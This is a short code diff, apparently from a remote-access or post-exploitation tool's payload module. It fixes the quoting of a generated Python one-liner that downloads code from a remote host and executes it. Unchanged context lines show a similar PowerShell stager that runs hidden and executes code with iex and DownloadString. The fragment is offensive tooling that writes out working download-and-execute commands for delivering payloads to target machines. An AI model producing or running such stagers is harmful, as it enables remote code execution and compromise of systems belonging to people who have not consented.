@@ -196,6 +196,6 @@ def do(server, handler, config, args):
             pass
 
         if args.format=='py':
-            handler.display(Success("ONELINER: python -c 'import urllib;exec urllib.urlopen(\"http://{}/{}\").read()'".format(host, wwwpath)))
+            handler.display(Success('ONELINER: python -c "import urllib;exec(urllib.urlopen(\\"http://{}/{}\\\").read())"'.format(host, wwwpath)))
         elif args.format=='ps1':
             handler.display(Success("ONELINER: powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://{}/{}')\"".format(host, wwwpath)))
